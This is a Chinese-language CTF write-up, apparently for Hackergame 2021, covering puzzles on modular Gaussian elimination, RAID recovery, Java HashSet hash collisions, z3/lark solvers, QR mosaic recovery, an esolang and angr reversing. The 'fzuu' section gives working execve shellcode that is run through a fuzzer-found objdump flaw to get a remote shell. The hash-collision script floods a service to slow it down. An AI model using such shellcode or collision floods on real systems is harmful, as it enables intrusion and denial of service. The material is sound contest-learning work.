    [189] * 5 + [33] * 4 + [189] * 3,
    [189] * 5 + [33,189,33,33] + [189] * 3,
    [189] * 3 + [33,33,189,189,33,33,33] + [189] * 2,
    [189,134] + [33] * 2 + [189] * 4 + [33] * 2 + [189] * 2,
    [189,144] + [33] * 2 + [189] * 4 + [33] + [189] * 3,
    [189,142] + [33] * 2 + [189] * 4 + [33] * 3 + [189],
    [189,100,142,33] + [189] * 4 + [33] * 3 + [189],
    [189] + [142] * 2 + [189] * 6 + [33] + [189] * 2,
    [189,59,142,33] + [189] * 4 + [33] + [189] * 3,
    [189] * 2 + [33] * 2 + [189] * 8,
]).reshape((144))
```

然后就是算法的核心了，在模意义下的 `Gauss` 消元法：
```py
from Crypto.Util.number import inverse

def guess(c, d, modulus = 256):
    size = c.shape[0] # 默认的输入为方阵
    assert(c.shape[0] == c.shape[1])
    # 将方阵转化为上三角阵
    # [x x x]    [x x x]
    # [x x x] -> [0 x x]
    # [x x x]    [0 0 x]
    for i in range(size - 1): # 对于每一行
        for j in range(i + 1, size): # 对于它下面的每一行
            while c[j][i] != 0: # 如果这一行的第 i 列仍然不为 0
                t = c[j][i] // c[i][i] # 计算倍率
                # 因为存在交换，辗转相除，直至一方为 0

                # 整行减去第 i 行对应倍数
                c[j] = (c[j] - t * c[i]) % modulus
                d[j] = (d[j] - t * d[i]) % modulus

                # 交换两行
                if c[j][i] != 0:
                    c[[i, j]] = c[[j, i]]
                    d[[i, j]] = d[[j, i]]

    # 从下至上按行求解方程
    for i in range(size - 1, -1 ,-1):
        # 第 i 行的常数减去它下方已经求解完毕的未知数的的系数倍
        d[i] -= sum([(c[i][j] * d[j]) % modulus for j in range(i + 1, size)])
        d[i] %= modulus

        # 如果可以整除
        if d[i] % c[i][i] == 0:
            d[i] //= c[i][i]
        # 否则求解模意义下的逆元并相乘
        else:
            d[i] *= inverse(c[i][i], modulus)
            d[i] %= modulus
    return d
```

如此得到的 `d` 便是所要求的结果了，由于当时没有逆出来提交的 API，而想通过 js 实现点击又遇到了很多困难，于是直接用 win32 的 API实现模拟点击的功能了。

如果要使用的话，第一次采集信息时候将鼠标放在左上角的方块中间，第二次放在左上角右移一个的方块，程序会根据此数据计算方块偏移量，并模拟点击：
```py
import win32api
import win32con
import time

def click_cur(pos, times):
    win32api.SetCursorPos(pos)
    for _ in range(times):
        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN|win32con.MOUSEEVENTF_LEFTUP,0,0,0,0)

def get_cur():
    print('[+] waiting...',end='')
    for i in range(5):
        time.sleep(1)
        print(5 - i,end='...')
    print()
    return win32api.GetCursorPos()

def init():
    print('[+] please place your mouse the block at (0,0) in 5s')
    origin = get_cur()
    print(f'[!] (0,0) at {origin}')
    print('[+] please place your mouse the block at (0,1) in 5s')
    now = get_cur()
    print(f'[!] (0,1) at {now}')
    step = now[0] - origin[0]
    return origin, step

origin, step = init()
ans = ans.reshape((12,12))
for i in range(12):
    for j in range(12):
        click_cur((origin[0] + step * j, origin[1] + step * i), ans[i][j])
        time.sleep(0.1)
```

输入后得到 flag：

**flag{Lights_are_Linear_0ae7af96f3b90954}**

## 阵列恢复大师

### raid5

这道题 raid5 本质上比 raid0 更加简单，说起来真正对阵列有进一步的了解还是因为实验室 sas 服务器因为电源问题异常断电，导致八个硬盘中的一个不正常，造成了不小的麻烦。虽然没有着手解决，但也对 raid5 有了些更加好的理解。不过也因此，一直使用的镜像站挂了，换源之后开始怀念校内的千兆镜像了……

使用 `file *.img` 可以很快地看出来硬盘的基本信息：

```bash
$ file *.img
3D8qN9DH91Q.img: data
3RlmViivyG8.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 262143 sectors, extended partition table (last)
60kE0MQisyY.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 262143 sectors, extended partition table (last)
IrYp6co7Gos.img: data
QjTgmgmwXAM.img: data
```

因此，由于 raid5 的特性，第一块和第五块盘也就确定了，剩下的可能性一共 12 种，稍作实验，用 diskgenius 打开，选择组建虚拟raid，依次调整顺序，就可以得到想要的结果了。

![](https://cdn.gztime.cc/hg2021/disk1.jpg)

![](https://cdn.gztime.cc/hg2021/disk0.jpg)

只需将其导出为 img 镜像，并且使用 linux 系统挂载，根目录执行 `getflag.py` 即可。听说有不少人卡在了这里，毕竟 linux 和 windows 的目录分隔符号可能不一样啊（逃

**flag{a18325a1ec0f58292908455c2df8ffcd}**

### raid0

用同样的方法确认一下第一块盘：

```bash
file *.img
1GHGGrmaMM0.img: data
5qiSQnlrA4Y.img: data
ID7sM2RWkyI.img: data
RApjvIxRlu0.img: data
d3Be7V0EVKo.img: data
eRL2MQSdOjo.img: data
jCC60mutgoE.img: data
wlOUASom2fI.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 262143 sectors, extended partition table (last)
```

raid0 是纯粹把数据分布式存储了，同时直接使用 010 Editor 查看，也可以发现块大小是 128KB，人肉搜索几块的连续数据块，可以得到对应的序列，然而在 diskgenius 中并看不到文件系统，再定睛一看才发现是 xfs，windows 和 diskgenius 都不支持。

将其整个磁盘克隆到新的虚拟磁盘内，而后就能将其拖入 ubuntu 虚拟机，直接可以打开。

![](https://cdn.gztime.cc/hg2021/disk2.jpg)

于是运行，得到结果：

**flag{4857cdeac07d8456fcaedb61d07b0b7d}**

## 助记词

### 第一顿大餐

首先看看代码，发现了延时间主要是因为在 `equals` 函数中存在 `sleep` 操作：
```java
@Override
public boolean equals(Object o)
{
    if (o instanceof Phrase that)
    {
        try
        {
            TimeUnit.MILLISECONDS.sleep(EQUALS_DURATION_MILLIS); // TODO: remove it since it is for debugging
        }
        catch (InterruptedException e)
        {
            throw new RuntimeException(e);
        }
        return that.text.equals(this.text) && that.time.equals(this.time) && that.user.equals(this.user);
    }
    return false;
}

@Override
public int hashCode()
{
    return Objects.hash(this.text, this.time, this.user);
}
```

在 `LinkedHashSet` 中，插入时会先行计算 `hashCode` 如果 `hashCode` 相同，则依次沿着链表进行 `equals` 比较，如果均不匹配则插入链表尾部，否则不插入。

这道题的第一问很简单，只需要延迟 600ms，直接想到用完全一样的字符串进行哈希碰撞，于是第一关的 `payload` 也就是一个重复了 32 遍的同一条短语了。

**flag{h45h-m4p-c011i5i0n-0f-key-inpu75-2d575b13bd6194a2}**

### 第二顿大餐

而对于第二问，第一问的同意字符串一定行不通了，思路上觉得一定是需要做哈希碰撞了，先看看 `Java` 的字符串哈希以及 `Objects.hash` 的相关实现：

```java
public int hashCode() {
    int h = hash;
    if (h == 0 && value.length > 0) {
        char val[] = value;

        for (int i = 0; i < value.length; i++) {
            h = 31 * h + val[i];
        }
        hash = h;
    }
    return h;
}
```

`Objects.hash` 的实现也同理，只是将数组中元素的哈希做相似的处理，这里就不放出了。不过不搜不知道，一搜吓一跳。这一字符串的哈希算法饱受诟病，碰撞极其容易，甚至又一之后构造都很简单。而时间的哈希可以调试一下，能看到就是时间戳，每秒自增 1，于是相当于我们需要准备十秒内哈希计算结果相同的一组数据。于是准备穷举了，`python` 的效率不敢恭维，干脆用 `cpp` 写了个多线程，扔到服务器去跑。

如果令开始时间是 `t`，则我们希望在未来一段时间内构造 `m, n, ..., p` 使得满足：
```
m * 31 + t == n * 31 + t + 1 == ... == p * 31 + t + 9
```

我的代码实现可以在[这里](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts/%E5%8A%A9%E8%AE%B0%E8%AF%8D)，结束后看到 `mcfx` 的[代码](https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/#%E5%8A%A9%E8%AE%B0%E8%AF%8D)意识到这里面多了太多无用的运算，不过算法烂机器凑，直接从实验室 PVE 开了个虚拟机，跑个三四十线程还是很快的（逃

虽然没有严谨计算，但估算可知第一秒内能提交的数量一定比较多，而后的几秒钟因为需要与之前全部的元素进行 `equals` 操作，因此数量较少，手动在本地调整好数量之后、验证通过之后，准备发给服务器。

由于网络延时等因素，发给服务器的时间会影响到我们数据的解析，如果某一个没有在合适的时间被计算，就会导致后面的全部失败，因此这又是道抽奖题……(╬▔皿▔)╯

因为比较非，本人等了很久（

最后的解题脚本，如果说为什么突然用 `js`，那就是最开始以为要搞多并发……所以直接上 `axios` 了（逃

```js
const axios = require('axios');

const debug = false;

let token_param = '?token=your_token'

let url = 'http://202.38.93.111:10048/phrases'

if(debug) url = 'http://localhost:8080/phrases'

axios({
    method: 'delete',
    url: debug ? url : url + token_param,
}).then(res => console.log(res.data));

function dotest(data_) {
    setTimeout(() => {
        start = Date.now()
        console.log(start)
        axios({
            method: 'post',
            url: debug ? url : url + token_param,
            data: data_,
            headers: {
                'Content-Type': 'application/json',
            }
        }).then(res => {
            console.log(res.data);
            let diff = Date.now() - start;
            console.log(diff);
            if(!res.data.flag2)
            axios({
                method: 'delete',
                url: debug ? url : url + token_param,
            }).then(_ => dotest(data1));
        })
        .catch(err => console.log(err.data));
    }, (parseInt(Date.now()/1000) + 1) * 1000 - Math.random() * 500 - Date.now());
}

data1 = '['

// 681972554 0
data += '"anything text drive bottom", "author basis instance inflation", "category scene paper fact", "charge spot being finding", "company page dealer product", "competition county garden couple", "demand choice skill support", "department safety hold wait", "desire line model green", '
// 681972553 1
data += '"data model temperature fail", "activity gift science inside", "black black writing beginning", "brown demand ground number", '
// 681972552 2
data += '"animal complex rent visit", "anything check government while", "design effect decision context", '
// 681972551 3
data += '"amount credit pair game", "benefit attention user press", '
// 681972550 4
data += '"appearance savings boat turn", "pair face task bank", '
// 681972549 5
data += '"anything advantage broad reading", "area board tonight reference", '
// 681972548 6
data += '"apartment room pressure produce", "charge advice kind deal", '
// 681972547 7
data += '"attention army heart cell", "benefit beginning form alternative", '
// 681972546 8
data += '"account training community minute", "advertising move average shopping", '
// 681972545 9
data += '"beyond display visit course", "camera individual active government", "function president history common"'
data += ']'


dotest(data)
```

**flag{differen7-key5-h45h-m4p-c011i5i0n-c1a632ea5e992158}**

## Co-Program

### Co-Login

一看到解方程我就想到了微软的开源求解器 —— `z3` (什么是[z3](https://github.com/Z3Prover/z3)), 但是一直苦于怎么把新的运算定义进去，也没想好变量怎么定义，走投无路的时候想起来之前 TCTF 用到的 parser 库 `lark`，便想着用它来筛选符号和确定优先级，没想到这下可好，柳暗花明又一村，二者结合，通过定义 `Transformer` 的方式解决我所有的问题，并且还十分方便。

于是我准备在这里详细讲讲有关于他们的基本用法和怎么结合他们来进行这道题目的运算。

从 `z3` 讲起，这有一个十分简单的例子：
```py
>>> from z3 import *
>>> a = Int('a')
>>> b = Int('b')
>>> solve(a + b == 5, a > 8)
[b = -4, a = 9]
```

简单来说，只要给定适当的约束，`z3`便可以将其求解出来。其中的 `BitVec` 可以作为直接的定义这一整数是多少位的，因此对于这道题我们可以直接使用 36 bit 的 `BitVec`，而对于有符号和无符号运算，`z3`也给出了一套的函数可供选择，详见[这里](https://z3prover.github.io/api/html/namespacez3py.html)。

之后，我们来聊聊 `lark` 是什么。如果你不知道 `parser` 是什么，可以先参考我[这篇博客](https://blog.gztime.cc/posts/2021/a5656446/)。总之，`lark`提供了一种方便的方法，能够进行自定义的语法解析以及计算，对于这道题，我们可以定义语法：
```lark
?start: sum

?sum: product
    | sum "+" product   -> add
    | sum "-" product   -> sub

?product: atom
    | product "*" atom  -> mul
    | product "/" atom  -> div
    | product "%" atom  -> mod

?atom: NAME             -> var
    | "-" atom          -> neg
    | "(" sum ")"

%import common.CNAME -> NAME
%import common.NUMBER
%import common.WS_INLINE
%ignore WS_INLINE
```

可以在上述博客中找到更详细的有关于这一优先级的定义的内容，这里略过。在得到语法结构之后，我们可以定义`Transformer`来将语法树合并为我们想要的结果，而在合并的过程中，我们可以自定义运算符的行为，在这里我们就可以将题目的设定加入，维护变量字典，并限制为无符号计算。

```py
@v_args(inline=True)
class Convertor(Transformer):
    from operator import add, sub, mul, neg

    # 定义模意义下的无符号除法，并对除数为 0 进行处理
    def div(self, a, b):
        return If(b == 0, BOUNDRY, UDiv(a, b))

    # 定义模意义下的无符号取模，并对除数为 0 进行处理
    def mod(self, a, b):
        return If(b == 0, a, URem(a, b))

    def __init__(self):
        self.vars = {}

    def var(self, name):
        if name[0] not in self.vars.keys():
            self.vars[name[0]] = BitVec(name, 36)
        return self.vars[name[0]]
```

有以上的基础，我们就可以通过**语法树的解析**、**变量字典的维护**、**语法树合并的运算符自定义**来做到我们需要达成的全部操作了。

完整代码如下：
```py
from z3 import *
from lark import Lark, Transformer, v_args
from pwn import *
from tqdm import tqdm

# context.log_level = 'debug'

token = b'your token here'

BOUNDRY = 2 ** 36 - 1

# 定义解析器语法
GRAM = '''?start: sum

?sum: product
    | sum "+" product   -> add
    | sum "-" product   -> sub

?product: atom
    | product "*" atom  -> mul
    | product "/" atom  -> div
    | product "%" atom  -> mod

?atom: NAME             -> var
    | "-" atom          -> neg
    | "(" sum ")"

%import common.CNAME -> NAME
%import common.NUMBER
%import common.WS_INLINE
%ignore WS_INLINE'''

# 初始化连接
def init_conn(token):
    io = remote('202.38.93.111', 10700)
    io.sendlineafter(b'token: ', token)
    io.recvline()
    return io

# 获取当前题目
def get_problem():
    expr = io.recvline().decode().strip()
    ans = int(io.recvline().decode().strip())
    return expr, ans

# 回答题目
def answer_problem(vars_):
    io.sendline(' '.join(f'{i[0]}={i[1] if i[1] is not None else 0}' for i in vars_).encode())

# 转换器
@v_args(inline=True)
class Convertor(Transformer):
    from operator import add, sub, mul, neg

    def div(self, a, b):
        return If(b == 0, BOUNDRY, UDiv(a, b))

    def mod(self, a, b):
        return If(b == 0, a, URem(a, b))

    def __init__(self):
        self.vars = {}

    def var(self, name):
        if name[0] not in self.vars.keys():
            self.vars[name[0]] = BitVec(name, 36)
        return self.vars[name[0]]

# 初始化解析器
def init_parser(convertor):
    return Lark(GRAM, parser='lalr', transformer=convertor)

# 将 z3 的结果的 model 返回
def solve_with_return(*args, **keywords):
    so = Solver()
    so.set(**keywords)
    so.add(*args)
    r = so.check()
    if r == unsat:
        return None
    elif r == unknown:
        try:
            return so.model()
        except Z3Exception:
            return None
    else:
        return so.model()

if __name__ == '__main__':
    convertor = Convertor()
    parse = init_parser(convertor).parse
    io = init_conn(token)

    for _ in tqdm(range(100)):
        expr, ans = get_problem()
        try:
            question = parse(expr) # 解析表达式为 z3 的格式
            result = solve_with_return(question == ans) # 传递给 z3 进行求解

            if result is None:
                raise TypeError

            to_send = []
            for name in convertor.vars.keys():
                to_send.append([name, result[convertor.vars[name]]])

            answer_problem(to_send)
        except:
            io.sendline()
        finally:
            convertor.vars.clear()

    print(io.recvall())
```

至此，题目完成。

(z3 nb!!!

**flag{z3isgood!-a4dd6de004}**

### Co-UnitTest

这道题最开始是很畏惧的，也不知道怎么写，感觉会很难。到最后一天干脆准备躺平，但是看着这个表达式如此得有规律，说不定可以在更多的限定之下将其做出来，于是做了如下的工作：

写了个解析器生成器，因为考虑到这里面嵌套的表达式无外乎两三层的符号的拼接，于是：
```py
operations = ['-', '+', '*', '/', '%']

def gen_expr(depth = 0, use_single = True):
    for item in ['x', 'y']:
        yield item

    if depth == 2:
        return

    for op in operations:
        for lval in gen_expr(depth + 1):
            for rval in gen_expr(depth + 1):
                if lval == rval and op == '-': # avoid zero
                    continue
                yield f'({lval}{op}{rval})'
```

定义一个合适的数值计算的`Transformer`：
```py
BOUNDRY = 2 ** 36

@v_args(inline=True)
class Convertor(Transformer):
    def neg(self, a):
        return (-a) % BOUNDRY

    def mul(self, a, b):
        return (a * b) % BOUNDRY

    def sub(self, a, b):
        return (a - b) % BOUNDRY

    def add(self, a, b):
        return (a + b) % BOUNDRY

    def div(self, a, b):
        return BOUNDRY - 1 if b == 0 else a // b

    def mod(self, a, b):
        return a if b == 0 else a % b

    def __init__(self):
        self.vars = {}

    def assign(self, x, y):
        self.vars['x'] = x
        self.vars['y'] = y

    def var(self, name):
        if name[0] not in self.vars.keys():
            return 0
        return self.vars[name[0]]
```

再定义一个如果题目太简单直接跳过的处理：
```py
def solve_easy(problems):
    easy = True
    for item in problems: # 如果全是 0
        if item[2] != 0:
            easy = False
            break
    if easy:
        io.sendline(b'x-x')
        return True
    easy = True
    for item in problems:
        if item[2] != BOUNDRY - 1: # 如果全是 2^36 - 1
            easy = False
            break
    if easy:
        io.sendline(b'x/(x-x)')
        return True
    return False
```

之后就是**超级无敌大力**的暴力加无脑了（完全没有上一问的优雅）：
```py
io = init_conn(token)
convertor = Convertor()
assign = convertor.assign
calc = init_parser(convertor).parse

for _ in range(10):
    problems = get_problem() # 获取题目
    if solve_easy(problems): # 处理简单题
        continue

    equals = {} # 等式字典
    for idx, problem in enumerate(problems): # 对于每道题目
        assign(problem[0], problem[1]) # 更改解析器当前的 x, y
        for expr in gen_expr(): # 生成表达式
            res = calc(expr) # 计算表达式
            if res == problem[2]: # 一样就添加进字典
                equals[idx] = expr
                break
            elif (-res) % BOUNDRY == problem[2]: # 刚好取反也可以添加
                equals[idx] = f'(-{expr})'
                break

    if len(equals.keys()) < 5: # 如果有没有穷举出来的，直接跳过（任性
        io.sendline()
        continue

    use = {}

    for i in range(5):
        x = problems[i][0] # 取当前的 x 值
        for expr in gen_expr():
            assign(problems[i][0], problems[i][1])
            if x > calc(expr):  # 穷举全部能够使得当前问题的布尔条件成立……
                continue

            fail = False
            for j in range(5): # ……并且其余一概不成立的表达式
                if i == j:
                    continue
                assign(problems[j][0], problems[j][1])
                if problems[j][0] <= calc(expr):
                    fail = True
                    break
            if fail:
                continue

            use[i] = expr
            break

    if len(use.keys()) < 4: # 至少需要用四个，不足四个直接跳过（继续任性
        io.sendline()
        continue

    no_use = set(range(5)) - set(use.keys())
    if len(no_use) > 0:
        no_use = list(no_use)[0]
    else:
        no_use = 4
        use.pop(4)

    # 格式化为 if(x<=a,b,if(x<=c,d,if(x<=e,f,if(x<=g,h,i)))) 直接输出
    result = equals[no_use]
    for item in use.keys():
        result = f'if(x<={use[item]},{equals[item]},{result})'

    io.sendline(result)

io.recvall()
```

没想到效果特别好，准确率还特别高，这一定是出题人的问题（逃

**flag{dIdy0uUseCvC5?-c0a8a4432c}**

## 马赛克

二维码一直都是 `NanoApe` 的拿手菜，这道也不例外，他也拿了个一血（

我做这道题的过程是比较坎坷的，因为思路方向错误导致了一些很奇葩的问题……还好后期成功改正好了。

这道题最大的入手点是**大部分的方块是不对齐的**，因此我们可以补全大部分的方格，在此之上穷举少量的方格就可以找到正确答案，而这种方格的布局是从二维码周围开始，所以我们考虑以螺旋遍历的顺序进行补全。

搜索二维码可行解的主要逻辑：
```py
for allow in [1, 2, 3, 4, 50, 1024]: # 可接受的解的个数的阈值
    bar = tqdm(get_dir_matrix(N), total = N * N) # 生成一个矩阵的螺旋遍历，由外向内进行搜索

    for i, j in bar:
        bar.set_description(f'now at ({i: 2},{j: 2}) ')
        ox1, ox2, oy1, oy2, result = search(i, j, pixels) # 搜索当前位置的可行解
        valid = [i[1] for i in result if i[0] == 0] # 只取其中误差为 0 的

        if 0 < len(valid) <= allow: # 对于 1 ~ allow 个数的解
            res = random.choice(valid) # 随机取一个，二维码有纠错
            for x in range(ox1, ox2):
                for y in range(oy1, oy2):
                    if pixels[x][y] == 2: # 没有被上色才上色
                        pixels[x][y] = res[x - ox1][y - oy1]
                    elif pixels[x][y] != res[x - ox1][y - oy1]: # 如果已经上色的颜色不符则输出
                        print(f'warning!! can not solve pixel ({x}, {y})')
```

对于每一个区块的可行解：
```py
def dfs(positions, explore, judge):
    if len(positions) != 0:
        possibilities = []
        x, y = positions[0]
        for case in [0, 1]:
            explore[x][y] = case
            possibilities += dfs(positions[1:], explore, judge)
        explore[x][y] = 2
        return possibilities
    else:
        # 再无空的元素时候判定灰度值
        return [(judge(explore), explore.copy())]


# for block (i, j)
def search(i, j, pixel_data):
    # left top corner
    x, y = X + i * BOX_SIZE, Y + j * BOX_SIZE

    # range of pixels to generate one mosaic block
    # left top corner of pixels
    ld_x, ld_y = x // PIXEL_SIZE, y // PIXEL_SIZE
    # right bottom corner of pixels
    up_x, up_y = (x + BOX_SIZE) // PIXEL_SIZE + 1, (y + BOX_SIZE) // PIXEL_SIZE + 1

    # range of current mosaic block in original image
    # left top corner of original image
    ox1, oy1 = X + i * BOX_SIZE, Y + j * BOX_SIZE
    # right bottom corner of original image
    ox2, oy2 = X + (i + 1) * BOX_SIZE, Y + (j + 1) * BOX_SIZE

    # range of current mosaic block in expanded pixels block
    # left top corner of expanded pixels
    x1, y1 = ox1 - ld_x * PIXEL_SIZE, oy1 - ld_y * PIXEL_SIZE
    # right bottom corner of expanded pixels
    x2, y2 = ox2 - ld_x * PIXEL_SIZE, oy2 - ld_y * PIXEL_SIZE

    raw = pixel_data[ld_x: up_x, ld_y: up_y].copy()
    positions = [i for i in zip(*np.where(raw == 2))]

    def judge(part):
        part = scale_(part, PIXEL_SIZE)
        part = (part == 0) * 255
        part = part.astype('uint8')[x1: x2, y1: y2]
        opart = orignal_data[ox1: ox2, oy1: oy2].copy()
        assert(opart.shape == part.shape)
        assert(np.min(opart == mosaic[i][j]))
        loss = np.abs(mosaic[i][j] - math.floor(part.mean()))
        return loss

    result = dfs(positions, raw, judge)
    result.sort(key = lambda pa: pa[0])

    return (ld_x, up_x, ld_y, up_y, result)
```

对于一些工具函数的实现、二维码扫描库 `pyzbar` 的使用、绘图、裁剪、缩放 `numpy` 数组等操作可以在代码仓库中查看：[solve.ipynb](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts/mosaic/solve.ipynb)

**flag{QRcodes_are_pixel_arts_EvSwCSAWtP}**

## JUST BE FUN

从官方 wp 中才看到这是在考察[EsoLang](https://zh.wikipedia.org/wiki/%E6%B7%B1%E5%A5%A5%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80)的理解和编写，与去年的`brainfuck`相似，写的时候很好玩。

`mcfx`和`NanoApe`是写了一个汇编器，对于这个东西我倒是蛮好奇的，回头应该会单独出一个博客来探索（挖坑

而我做这道题，直接将 Excel 变成了 IDE，面向 Excel 编程，可以意识到，我们需要用给出的运算来实现另外的四种运算，于是我的计划便是他们各自一层：

![](https://cdn.gztime.cc/hg2021/fun_layer0.png)
<center>第0层</center>

这一层的主要任务是：
- 输入输出
    输入的数字字符需要减去`0`的ascii，之后输入运算符，注意每次分支的时候都会移除栈顶元素，所以需要按时得进行栈顶元素的复制(`:`)
- 输入运算符分支的选择
    输入一个符号，判断作差是否为`0`进行分支

![](https://cdn.gztime.cc/hg2021/fun_layer1.png)
<center>第1层</center>

这一层的主要任务是将执行流放到左侧，使得程序写起来舒服。后面发现这里的空间刚刚好可以用来做一些运算前的准备工作，**初始化栈空间**。为了逻辑的连续性，这部分的操作我在下面展开。

为方便解释，栈用`[a, b, c, ...]`的形式表示，以右侧为栈顶。

![](https://cdn.gztime.cc/hg2021/fun_layer2.png)
<center>第2层</center>

这一层的目标是完成乘方计算，由于系数不超过十，也就没必要做快速幂了（逃

这一层的栈空间为：`[ans, base, times, continue]`

- `ans`: 答案
- `base`: 乘方的底数
- `times`: 循环次数，初始化为指数减一
- `continue`: 以此为栈顶元素来判断是否继续循环

操作流程：

1. 判断`continue`决定是否继续，中止则跳转到`7`
2. 调整栈空间为：`[times, base, ans, base]`
3. 做乘法，得到新的`ans`
4. 调整栈空间为：`[ans, base, times]`
5. 做减法，循环次数减一，得到新的`times`
6. 复制`times`取反得到`continue`，跳转到`1`
7. 弹出栈顶两元素，留下`ans`返回

![](https://cdn.gztime.cc/hg2021/fun_layer3.png)
<center>第3层</center>

这一层是左移，由于 $a << b = a * 2 ^ b$ ，因此我们可以将 `a` 放在栈底，构造 $2 ^ b$ 的栈顶结构，进行与乘方相同的计算。

这一层的栈空间为：`[number, powres, 2, times, continue]`

- `number`: 被左移的数
- `powres`: 乘方的结果

操作流程：

1. 在当前栈空间执行乘方的流程，得到`[number, powres]`
2. 直接做乘法

![](https://cdn.gztime.cc/hg2021/fun_layer4.png)
<center>第4层</center>

或的操作要更加复杂一些，这里的伪代码可以视作：
```py
tmp = 0
count = 0
while a + b != 0:
    bit = !!(a % 2 + b % 2)
    a /= 2
    b /= 2
    tmp = tmp * 2 + bit
    count += 1
# 这里得到的结果尚未是最终结果，二进制位恰好调转
ans = 0
while count > 0:
    bit = tmp % 2
    ans = ans * 2 + bit
    tmp /= 2
    count -= 1
# 这里的 ans 就是最终的结果了
```

这一层第一部分的栈空间为：`[count, ans, a, b, continue]`

- `count`: 位数
- `ans`: 按位或的反转结果
- `a, b`: 操作数
- `continue`: 以此为栈顶元素来判断是否继续循环

操作流程，为方便我直接操作栈内情况：

1. 判断`continue`决定是否继续，中止则跳转到`13`
2. `[ans, a, b, count + 1]`
3. `[count + 1, ans, a, b, b % 2]`
4. `[count + 1, ans, b % 2, b, a, a % 2]`
5. `[count + 1, ans, a, b, b % 2 + a % 2]`
6. `[count + 1, ans, a, b, bit]` (`bit = !!(b % 2 + a % 2)`)
7. `[count + 1, ans, a / 2, bit, b / 2, b / 2 + a / 2]`
8. `[count + 1, ans, a / 2, bit, b / 2, continue]` (`continue = b / 2 + a / 2`)
9. `[count + 1, continue, a / 2, b / 2, bit, ans]`
10. `[count + 1, continue, a / 2, b / 2, ans * 2 + bit]`
11. `[count + 1, ans * 2 + bit, a / 2, b / 2, continue]`
    -> `[count, ans, a, b, continue]`
12. `continue`取反，跳转到`1`
13. 弹出栈顶两元素，留下`count, ans`返回

这一层第二部分的栈空间为：`[result, ans, count, continue]`

这里的`continue`是`count`次循环的判据，与上文不同。且 `result = 0` 为初始化时候入栈。

操作流程，同样为方便我直接操作栈内情况：

1. 判断`continue`决定是否继续，中止则跳转到`8`
2. `[count, ans, result * 2]`
3. `[count, result * 2, ans, ans % 2]`
4. `[count, ans, result * 2 + ans % 2]`
5. `[count, result * 2 + ans % 2, ans / 2]`
6. `[result * 2 + ans % 2, ans / 2, count - 1]`
    -> `[result, ans, count, continue]` (`continue = count`)
7. `continue`取反，跳转到`1`
13. 弹出栈顶两元素，留下`result`返回

![](https://cdn.gztime.cc/hg2021/fun_layer5.png)
<center>第5层</center>

异或和或的唯一区别在于按位算时需要更改一下，即上述 `bit` 的赋值：
`bit = (b % 2 + a % 2) % 2`

其余操作完全一样，于是翻转的操作也下放到上一层进行。

最后将其结果转换为所需求的格式，上传即可。

**flag{ju5t_b3_fun_00aacf491c}**

## fzuu

进入注三所指向的网址，可以看到什么是 AFL：american fuzzy lop，简单来说就是通过编译时插桩、分支检测等方式寻找程序的漏洞，对于这道题，我们用其所给的跑一下。

最开始用的参数有问题，fuzz 了好几个小时都没有能用的 payload，最后才发现我把 `-d` 写成了 `-a`……
```bash
$ afl-fuzz -i fuzz_in/ -o found ./objdump_afl -d @@
```

私以为这个界面真帅：

![](https://cdn.gztime.cc/hg2021/fuzz.jpg)

再一段时间的运行之后，我们发现了这样一个 payload:
```bash
$ ./objdump -d ./found/fuzzer5/crashes/id\:000000\,sig\:04\,src\:000063+000073\,op\:splice\,rep\:2
Illegal instruction

$ xxd ./found/fuzzer5/crashes/id\:000000\,sig\:04\,src\:000063+000073\,op\:splice\,rep\:2
00000000: 5331 3030 3030 30ff ffff ffff 7fff ff7b  S100000........{
```

于是使用 gdb 调试，看看发生了什么，在崩溃处：
```bash
 RIP  0x7fffffffced2 ◂— 0x7bffff7fffffffff
───────────────────[ DISASM ]───────────────────
Invalid instructions at 0x7fffffffced2
```

于是意识到，程序将我们的输入从第八字节开始直接执行了，于是直接从[shell-strom](http://shell-storm.org/shellcode/)上找个`shellcode`，拼接后执行：

```py
from base64 import b64encode
code = b'S100000\xff1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05'
open('exp.1.bin','wb').write(code)
print(b64encode(code))
```

测试执行：
```bash
┌──(user㉿GZTime-LAPTOP)-[/mnt/…/CTF/hackergame2021/fzuu]
└─$ ./objdump -d exp.1.bin
$ ls
exp.1.bin  exp.bin objdump  objdump.i64  objdump_afl
```

直接获取 `shell`，于是上传：
```bash
Input your payload in base64: UzEwMDAwMP8xwEi70Z2WkdCMl/9I99tTVF+ZUldUXrA7DwU=
ls
bin
flag.txt
lib
lib32
lib64
libx32
main.sh
objdump
cat flag.txt
flag{FuZzlng_Ls_uSeFuI_IN_Testing_e444e963fe}
```

**flag{FuZzlng_Ls_uSeFuI_IN_Testing_e444e963fe}**

## 超 OI 的 Writeup 模拟器

~~好欸，我上电视了~~，成功被出题人引用了hhhhh

这次我的确没有做两小时了（逃，虽然二进制还是不够强，没做出来第三问orz，既然做了自动化，前两问就一起解了。

先用 IDA 打开分析，发现不论是哪个函数的输入都会被存入两个 `int64` 中，在传递进入函数时候的寄存器操作是一样的：

![](https://cdn.gztime.cc/hg2021/re0.jpg)
<center>0.bin</center>


![](https://cdn.gztime.cc/hg2021/re1.jpg)
<center>1.bin</center>

因此这一部分的特征是相同的，有着相同的十六进制编码，因此我们可以以此确定 `call magic_function` 的具体地址。

即可以搜索：`488b45f04883c008488B10488B45F048` 确定地址偏移量，而我们用 `angr` 的分析操作也就从这里开始。

如果你不知道 `angr` 是什么，可以先行搜索一下。而利用它，我们可以将两个寄存器的值设置为要求解的对象，并且对输出限制，使其自动求解。

```py
# get the address of `call magic_function`
def get_addr(file):
    bin_ = open(file, 'rb').read()
    return bin_.find(bytes.fromhex('488b45f04883c008488B10488B45F048')) + 24

def succ(state):
    return b'Correct' in state.posix.dumps(1)

def fail(state):
    return b'Wrong' in state.posix.dumps(1)
```

进行自动求解：
```py
def solve(file):
